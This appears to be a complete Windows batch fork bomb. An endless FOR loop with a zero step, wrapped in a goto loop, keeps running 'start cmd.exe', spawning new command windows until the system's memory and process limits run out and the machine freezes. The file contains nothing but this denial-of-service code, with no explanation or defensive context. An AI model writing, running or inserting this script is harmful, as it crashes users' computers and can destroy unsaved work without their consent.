@echo off
:loop
FOR /L %%A IN (1, 0, 1) DO (
    start cmd.exe
)
goto loop
